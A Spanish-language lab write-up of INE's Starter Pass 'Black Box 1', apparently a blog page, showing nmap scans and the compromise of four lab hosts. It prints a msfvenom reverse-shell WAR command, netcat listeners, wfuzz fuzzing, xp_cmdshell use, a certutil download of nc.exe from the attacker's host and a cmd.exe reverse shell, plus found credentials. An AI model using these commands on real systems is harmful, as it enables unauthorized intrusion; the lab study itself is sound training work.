@@ -1,0 +1,404 @@
+I"&X<p>Black Box 1 de 3 del Starter Pass de INE. En este caso estamos en un segmento de red 172.16.64.0/24(abarca desde la 172.16.64.0 hasta la 172.16.64.255)</p>
+
+<p>1 - <a href="#recon">Reconocimiento inicial</a></p>
+
+<p>2 - <a href="#maquina1">Explotamos la 172.16.64.101</a></p>
+
+<p>3 - <a href="#maquina2">Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199</a></p>
+
+<p>4 - <a href="#maquina3">Credenciales ocultas para 172.16.64.182</a></p>
+
+<h1 id="recon">Reconocimiento inicial</h1>
+<p>Ya que no tenemos una IP en específico para atacar, tocará hacer un escaneo de <code class="language-plaintext highlighter-rouge">nmap</code>
+a todo el segmento de red.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.92 scan initiated Wed Sep  8 12:12:56 2021 as: nmap -p- --open -sC -sV -sS --min-rate 3000 -n -oN scan 172.16.64.0/24</span>
+Nmap scan report <span class="k">for </span>172.16.64.101
+Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65529 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 2 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-server-header: Apache-Coyote/1.1
+9080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache-Coyote/1.1
+59919/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+MAC Address: 00:50:56:A2:EC:AA <span class="o">(</span>VMware<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report <span class="k">for </span>172.16.64.140
+Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65478 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 56 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: 404 HTML Template by Colorlib
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+MAC Address: 00:50:56:A2:E5:76 <span class="o">(</span>VMware<span class="o">)</span>
+
+Nmap scan report <span class="k">for </span>172.16.64.182
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65420 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 114 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class="o">(</span>ED25519<span class="o">)</span>
+MAC Address: 00:50:56:A2:5E:B5 <span class="o">(</span>VMware<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report <span class="k">for </span>172.16.64.199
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65522 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000.00<span class="p">;</span> RTM
+| ms-sql-ntlm-info: 
+|   Target_Name: WIN10
+|   NetBIOS_Domain_Name: WIN10
+|   NetBIOS_Computer_Name: WIN10
+|   DNS_Domain_Name: WIN10
+|   DNS_Computer_Name: WIN10
+|_  Product_Version: 10.0.10586
+|_ssl-date: 2021-09-08T10:16:07+00:00<span class="p">;</span> +2s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-09-08T08:07:38
+|_Not valid after:  2051-09-08T08:07:38
+7680/tcp  open  pando-pub?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49943/tcp open  ms-sql-s      Microsoft SQL Server 2014 12.00.2000
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-09-08T08:07:38
+|_Not valid after:  2051-09-08T08:07:38
+|_ssl-date: 2021-09-08T10:16:07+00:00<span class="p">;</span> +2s from scanner time.
+| ms-sql-ntlm-info: 
+|   Target_Name: WIN10
+|   NetBIOS_Domain_Name: WIN10
+|   NetBIOS_Computer_Name: WIN10
+|   DNS_Domain_Name: WIN10
+|   DNS_Computer_Name: WIN10
+|_  Product_Version: 10.0.10586
+MAC Address: 00:50:56:A2:0A:0F <span class="o">(</span>VMware<span class="o">)</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| ms-sql-info: 
+|   172.16.64.199:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2014 RTM
+|       number: 12.00.2000.00
+|       Product: Microsoft SQL Server 2014
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+|_nbstat: NetBIOS name: WIN10, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:a2:0a:0f <span class="o">(</span>VMware<span class="o">)</span>
+|_clock-skew: mean: 1s, deviation: 0s, median: 1s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-09-08T10:15:58
+|_  start_date: 2021-09-08T08:07:22
+
+Post-scan script results:
+| ssh-hostkey: Possible duplicate hosts
+| Key 2048 7f:b7:1c:3d:55:b3:9d:98:58:11:17:ef:cc:af:27:67 <span class="o">(</span>RSA<span class="o">)</span> used by:
+|   172.16.64.101
+|   172.16.64.182
+| Key 256 5f:b9:93:e2:ec:eb:f7:08:e4:bb:82:d0:df:b9:b1:56 <span class="o">(</span>ECDSA<span class="o">)</span> used by:
+|   172.16.64.101
+|   172.16.64.182
+| Key 256 db:1f:11:ad:59:c1:3f:0c:49:3d:b0:66:10:fa:57:21 <span class="o">(</span>ED25519<span class="o">)</span> used by:
+|   172.16.64.101
+|_  172.16.64.182
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Wed Sep  8 12:16:08 2021 -- 256 IP addresses (5 hosts up) scanned in 191.45 seconds</span>
+</code></pre></div></div>
+
+<h2 id="puertos-abiertos">Puertos abiertos</h2>
+
+<p>Bueno, tenemos 4 hosts disponibles con algunos puertos abiertos:</p>
+<ul>
+  <li>172.16.64.101</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH, para obtener una shell segura</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">8080</td>
+      <td style="text-align: left">Apache Tomcat</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">9080</td>
+      <td style="text-align: left">Otro Apache Tomcat</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">59919</td>
+      <td style="text-align: left">Apache 2.4.18</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<ul>
+  <li>172.16.64.140</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">Apache 2.4.18</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<ul>
+  <li>172.16.64.182</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH, para obtener una shell segura</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<ul>
+  <li>172.16.64.199</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">135</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">139</td>
+      <td style="text-align: left">SMB, recursos compartidos del sistema</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB, recursos compartidos del sistema</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">1433</td>
+      <td style="text-align: left">MicroSoft SQL</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">7680</td>
+      <td style="text-align: left">pando-pub(ni idea)</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49664-49670</td>
+      <td style="text-align: left">msrpc</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">49943</td>
+      <td style="text-align: left">MicroSoft SQL(otra vez)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Como he hecho un escaneo de la versión y el servicio además de lanzar unos scripts básicos de enumeración en el mismo escaneo, ya no necesito usar herramientas como <a href="https://pastebin.com/tYpwpauW">extractPorts</a>.</p>
+
+<h1 id="maquina1">Explotación de la 172.16.64.101</h1>
+
+<p>Teniendo todos los puertos podríamos empezar por la .101 por ejemplo. Si abrimos Firefox y entramos a los puertos de los servidores HTTP encontramos la misma página: <img src="https://user-images.githubusercontent.com/71317374/132499799-309aa1a6-7ee5-4d28-bfe8-7eda222d89a4.png" alt="imagen" /></p>
+
+<h2 id="explotación-de-un-apache-tomcat">Explotación de un Apache Tomcat</h2>
+
+<p>Los servidores Apache Tomcat(puertos 8080 y 9080) tienen la ruta /manager/html, que te da acceso a la administración del sitio.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/132499957-ac6e1dc9-9daa-4e50-9483-14953156a10e.png" alt="imagen" /></p>
+
+<p>:/ No tenemos credenciales.</p>
+
+<p>Si le damos a cancelar, nos lleva a una página con un 401 Unauthorized y unas credenciales:</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/132500059-7ae5f09f-6240-436a-9bdc-639b997d6ac3.png" alt="imagen" /></p>
+
+<p>Y si las introducimos tenemos acceso a la administración del sitio.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/132500156-bb495740-c4c6-4e42-bf51-1fbabcb1a18d.png" alt="imagen" /></p>
+
+<p>Aquí puedes subir archivos .war que pueden ser maliciosos, así que podríamos obtener una reverse shell :0</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.16.64.10 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> war <span class="o">&gt;</span> eeeee.war
+</code></pre></div></div>
+
+<p>Generamos un archivo .war llamado eeeee.war y lo subimos a la página web usando la sección de Deploy</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/132502557-3c8dffe0-a5ff-4b5a-9ac4-ad7f4497c30d.png" alt="imagen" /></p>
+
+<p>Cuando le demos a Deploy aparecerá el nombre de nuestro archivo listado en Applications, pero antes vamos a la consola y abrimos un listener de netcat en el puerto 443
+con <code class="language-plaintext highlighter-rouge">nc -nlvp 443</code>, y entonces le damos a nuestro archivo y conseguimos una reverse shell como el usuario tomcat8.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat <span class="nt">-nlvp</span> 443
+Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 172.16.64.101.
+Ncat: Connection from 172.16.64.101:39542.
+<span class="nb">whoami
+</span>tomcat8
+</code></pre></div></div>
+
+<p>Para tener una consola totalmente interactiva, tendríamos que hacer un <a href="https://www.thehackersnow.com/tratamiento-de-una-tty/">tratamiento de la TTY</a>.
+Ahora, hay que dirigirse a /home para recoger las flags de esta máquina, ubicadas en /home/adminels/Desktop y en /home/developer</p>
+
+<h1 id="maquina2">Reconocimiento de 172.16.64.140 y explotación de 172.16.64.199</h1>
+
+<p>Tras comprometer la 172.16.64.101, nos dirigimos a la 172.16.64.140, que tiene un servidor HTTP corriendo el el puerto 80, así que vamos a fuzzearlo con la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> a ver si encontramos algo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 75 <span class="nt">-w</span> /usr/share/wordlists/directory-list-2.3-medium.txt 172.16.64.140/FUZZ
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://172.16.64.140/FUZZ
+Total requests: 220560
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload
+<span class="o">=====================================================================</span>
+000000039:   301        9 L      28 W       312 Ch      <span class="s2">"img"</span>
+000000553:   401        14 L     54 W       460 Ch      <span class="s2">"project"</span>
+000000550:   301        9 L      28 W       312 Ch      <span class="s2">"css"</span>
+
+Total <span class="nb">time</span>: 28.95585
+Processed Requests: 7961
+Filtered Requests: 7944
+Requests/sec.: 274.9357
+</code></pre></div></div>
+
+<p>Entre todos, el que destaca es /project, si vamos ahí nos encontramos con un inicio de sesión.</p>
+
+<p><img src="https://user-images.githubusercontent.com/71317374/132509149-aab25095-2e71-44b7-930f-39a153fd6d43.png" alt="imagen" /></p>
+
+<p>Si introducimos las credenciales admin:admin nos autentica en la esta web, que está configurada por defecto.
+Si hacemos fuzzing a /project con las credenciales admin:admin para autenticarnos(o el header “Authorization: Basic YWRtaW46YWRtaW4=”) encontramos /backup, y si volvemos a fuzzear en /backup encontramos /test, donde hay unos documentos de texto.</p>
+
+<p>Solo el tercero/sdadas.txt contiene unas credenciales para un servidor MSSQL(ubicado en la 172.16.64.199) y una ruta con una de las flags que hay que conseguir, que estaría en http://172.16.64.140/project/354253425234234/flag.txt</p>
+
+<h2 id="conseguimos-acceso-a-la-1721664199">Conseguimos acceso a la 172.16.64.199</h2>
+
+<p>Ahora que tenemos credenciales para el servidor MSSQL del puerto 1433, podemos usar la herramienta <a href="https://github.com/secureauthcorp/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a> de Impacket para conectarnos con las credenciales fooadmin:fooadmin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ mssqlclient.py fooadmin:fooadmin@172.16.64.199
+Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>WIN10<span class="se">\F</span>OOSQL<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>WIN10<span class="se">\F</span>OOSQL<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>120 7208<span class="o">)</span>
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt;
+</code></pre></div></div>
+
+<p>Y así llegamos al servidor SQL, del cual podemos sacar una shell con xp_cmdshell. Si escribimos “help” nos muestra una lista de comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="nb">help
+
+     </span>lcd <span class="o">{</span>path<span class="o">}</span>                 - changes the current <span class="nb">local </span>directory to <span class="o">{</span>path<span class="o">}</span>
+     <span class="nb">exit</span>                       - terminates the server process <span class="o">(</span>and this session<span class="o">)</span>
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell <span class="o">{</span>cmd<span class="o">}</span>          - executes cmd using xp_cmdshell
+     sp_start_job <span class="o">{</span>cmd<span class="o">}</span>         - executes cmd using the sql server agent <span class="o">(</span>blind<span class="o">)</span>
+     <span class="o">!</span> <span class="o">{</span>cmd<span class="o">}</span>                    - executes a <span class="nb">local </span>shell cmd
+</code></pre></div></div>
+
+<p>Habilitamos la consola con enable_xp_cmdshell y ejecutamos comandos con xp_cmdshell. Ya que no tenemos formas de enviarnos una reverse shell sin ningún programa, descargué un binario compilado de netcat(en Kali/Parrot hay uno) y mediante un servidor HTTP con Python y certutil.exe, me lo pude descargar y enviarme un cmd.exe a mi equipo.</p>
+
+<p>Primero, creamos un servidor con Python en el puerto 80(si no sois root necesitaréis sudo) usando la librería http de esta forma: <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code> y usando certutil.exe lo descargamos en la máquina
+con el comando <code class="language-plaintext highlighter-rouge">certutil.exe -urlcache -f http://tuip/nc.exe nc.exe</code></p>
+
+<p>Tras haberlo descargado, solo habría que ejecutarlo y con el parámetro -e enviar un cmd.exe a tu ip y el puerto en el que estés escuchando para conseguir acceso a esta máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap ncat <span class="nt">-nlvp</span> 443
+Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 172.16.64.199.
+Ncat: Connection from 172.16.64.199:49678.
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</code></pre></div></div>
+
+<h1 id="maquina3">Credenciales para la 172.16.64.182</h1>
+<p>Y así, estamos casi metidos hasta la cocina, ya que nos faltaría una máquina por comprometer, la 172.16.64.182, que solo tiene el puerto 22 abierto.</p>
+
+<p>Si miramos en el directorio Users encontramos varios usuarios, la flag está en C:\Users\AdminELS\Desktop, junto con lo que supuestamente es una clave pública de SSH:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>id_rsa.pub
+&lt;texto de relleno&gt;jUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ<span class="o">==</span> rsa-key-20190313###ssh://developer:dF3334slKw@172.16.64.182:22################&lt;relleno&gt;
+</code></pre></div></div>
+<p>Pero si la miramos de cerca vemos unas credenciales para la máquina que falta por comprometer, que serían las credenciales developer:dF3334slKw. Si entramos por SSH a la 172.16.64.182, veremos la última flag y habremos comprometido todas las máquinas de esta Black Box.</p>
+
+<p>Si te ha gustado puedes ir a mi <a href="https://github.com/binlaab">github</a> y darme una estrellita :)</p>
+:ET
